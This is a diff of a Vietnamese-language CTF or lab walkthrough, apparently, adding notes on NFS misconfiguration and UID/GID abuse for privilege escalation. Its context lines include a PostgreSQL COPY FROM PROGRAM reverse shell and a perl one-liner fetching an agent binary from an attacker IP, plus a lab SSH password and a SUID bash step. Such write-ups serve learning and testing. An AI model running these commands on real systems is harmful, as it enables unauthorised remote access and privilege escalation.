@@ -113,7 +113,7 @@ COPY cmd FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.17.152/4445 0>&1"';
 ![alt text](image-21.png)
 ![alt text](image-22.png)
 ```code
-perl -MIO::Socket::INET -e '$s=IO::Socket::INET->new("10.10.17.152:8000");print $s "GET /agent HTTP/1.0\r\n\r\n";while(<$s>){last if/^\r?\n$/}open F,">nfsclient";binmode F;print F while<$s>;close F'
+perl -MIO::Socket::INET -e '$s=IO::Socket::INET->new("10.10.17.152:8000");print $s "GET /agent HTTP/1.0\r\n\r\n";while(<$s>){last if/^\r?\n$/}open F,">agent";binmode F;print F while<$s>;close F'
 ```
 - Sau đó thực thi agent để kết nối lại máy chủ atk 
 ![alt text](image-23.png)
@@ -135,6 +135,13 @@ sudo ip route add 192.168.100.0/24 dev ligolo
 
 - SSH vào `192.168.100.2` để kiểm tra NFS , Pass :  `Friesf00Ds2025!!`
 ![alt text](image-27.png)
+
+- Phát hiện NFS share
+- NFS (Network File System) là protocol cho phép máy tính chia sẻ thư mục qua mạng. Client có thể mount (gắn kết) thư mục từ xa như thể nó là thư mục local.
+- Dấu `*` nghĩa là share này cho phép mọi IP truy cập - một lỗ hổng cấu hình.
+- NFS chỉ xác thực dựa trên UID/GID (số ID của user/group), không phải username
+- Nếu bạn có UID/GID giống với owner của file, bạn sẽ có quyền tương ứng
+![alt text](image-38.png)
 
 - Tuy nhiên quyền thấp nên không được được các file cert
 ![alt text](image-28.png)
@@ -160,7 +167,8 @@ sudo useradd -u 117 -g 59605603 -M -s /bin/bash barman_local
 id barman_local 
 ```
 
-- Copy bash và set SUID 
+- Copy file /bin/bash (shell binary) vào folder shared 
+- MỤC ĐÍCH: Tạo một bản copy của bash để ta có thể modify ownership từ xa qua NFS
 ![alt text](image-33.png)
 ![alt text](image-34.png)
 ![alt text](image-35.png)
